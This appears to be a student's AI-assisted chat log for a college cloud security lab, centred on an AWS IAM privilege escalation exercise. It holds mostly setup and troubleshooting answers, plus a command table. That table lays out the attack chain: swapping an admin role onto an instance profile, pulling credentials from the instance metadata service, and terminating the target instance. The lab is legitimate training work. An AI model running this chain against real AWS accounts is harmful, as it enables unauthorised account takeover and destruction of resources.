# AI Chat Log — Lab 2: IAM Privilege Escalation by Attachment
### CCGC 5501 — Cloud Security

---

## Understanding the Challenge

**Q: What is the challenge and what are we trying to achieve?**

> The infrastructure provisions three key IAM identities and one EC2 instance. The attacker user `kerrigan` has limited but exploitable permissions. The `meek` role is low-privilege, currently attached to the target EC2 instance. The `mighty` role is full admin (`Action: "*"`). The goal is to **terminate the target EC2 instance** (`cg-super-critical-security-server`) by escalating from Kerrigan's limited permissions to full admin access through IAM instance profile manipulation.

---

**Q: In 4 sentences max, what are we learning and what are the key points?**

> This challenge teaches that IAM privilege escalation doesn't require direct admin permissions, only a carefully crafted combination of lower-level permissions. The core vulnerability is that `iam:PassRole` + `ec2:RunInstances` + `iam:AddRoleToInstanceProfile` lets an attacker "launder" a powerful role onto a compute resource they control. Once an EC2 instance runs with an admin role, the **EC2 Instance Metadata Service (IMDS)** at `http://169.254.169.254/...` vends temporary credentials to anyone on that instance. IAM policies must be evaluated holistically — individually harmless permissions can chain into full account compromise.

---

## Environment & Setup

**Q: Why didn't it say "Congratulations — flag captured" like my previous challenge?**

> This challenge is not built on the CloudGoat platform which has a built-in completion checker. This is a standalone Terraform lab built by Humber College. The proof of completion is the terminated instance itself — your screenshot showing `terminated` state is your flag.

---

## Troubleshooting

**Q: Terraform is not recognized in PowerShell after winget install**

> Terraform was installed but not in the system PATH. Solution:
> 1. Found the install path: `C:\Users\brand\AppData\Local\Microsoft\WinGet\Packages\Hashicorp.Terraform_Microsoft.Winget.Source_8wekyb3d8bbwe`
> 2. Added it permanently to PATH:
> ```powershell
> [System.Environment]::SetEnvironmentVariable("Path", $env:Path + ";<PATH>", [System.EnvironmentVariableTarget]::User)
> ```
> 3. Fully closed and reopened VSCode for the PATH change to take effect.

---

**Q: SSH into the attack instance failed with "invalid format" on the key**

> PowerShell's `>` operator corrupts PEM file encoding. Fix — use `Out-File` instead:
> ```powershell
> aws ec2 create-key-pair --profile kerrigan --key-name kerrigan-attack-key2 `
>   --query "KeyMaterial" --output text | Out-File -Encoding ascii -FilePath kerrigan-attack-key2.pem
> ```

---

**Q: SSM start-session failed with AccessDenied**

> Kerrigan doesn't have `ssm:StartSession` permission — that's expected and by design. The solution was to relaunch the attack instance with a properly formatted SSH key pair attached using `--key-name`.

---

**Q: Kerrigan got AccessDenied on `GetInstanceProfile` when verifying the role swap**

> That's expected — Kerrigan doesn't have `iam:GetInstanceProfile`. Used `list-instance-profiles` instead which Kerrigan does have permission for, and it confirmed the `mighty` role was successfully attached.

---

**Q: `aws configure` prompted for a session token — what do I do?**

> Press Enter to skip it during `aws configure`, then set it separately:
> ```powershell
> aws configure set aws_session_token "<TOKEN>" --profile mighty
> ```
> This is required because IMDS returns temporary credentials that always include a session token.

---

**Q: Terraform destroy is stuck — how do I check in the AWS Console?**

> Check these two services in `us-east-1`:
> - **EC2 → Instances** — look for any `cg-*` instances still in `running` or `shutting-down` state
> - **VPC → Your VPCs** — look for any `cg-*` VPCs still existing
>
> Terraform gets stuck when EC2 instances haven't fully terminated, blocking VPC/subnet deletion. Manually terminate any remaining `cg-*` instances in the console, then re-run `terraform destroy`.

---

**Q: Terraform destroy said "0 destroyed" after I manually deleted resources in the console — am I still good?**

> Yes — Terraform confirmed there was nothing left to destroy because you already cleaned it up manually. The end result is the same: all resources are gone and there are no ongoing AWS charges.

---

**Q: I already initiated destroy so terraform output won't work — am I still good for submission?**

> Yes — all real values were already captured and documented in the SOLUTION.md during the lab run. All resource names, IDs, IPs, and outputs are recorded there. No outputs needed from Terraform state.

---

## Key Commands Reference

| Step | Command |
|---|---|
| Verify identity | `aws sts get-caller-identity --profile kerrigan` |
| List roles | `aws iam list-roles --profile kerrigan --query "Roles[?contains(RoleName,'cg-')]..."` |
| List instance profiles | `aws iam list-instance-profiles --profile kerrigan --output table` |
| Remove meek role | `aws iam remove-role-from-instance-profile --profile kerrigan ...` |
| Add mighty role | `aws iam add-role-to-instance-profile --profile kerrigan ...` |
| Launch attack instance | `aws ec2 run-instances --profile kerrigan ...` |
| Query IMDS role name | `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| Steal credentials | `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>` |
| Set session token | `aws configure set aws_session_token "<TOKEN>" --profile mighty` |
| Verify admin access | `aws sts get-caller-identity --profile mighty` |
| Terminate target | `aws ec2 terminate-instances --profile mighty --instance-ids i-04cb792e4bbe5bfa2` |
| Verify terminated | `aws ec2 describe-instances --profile mighty --instance-ids i-04cb792e4bbe5bfa2` |

---


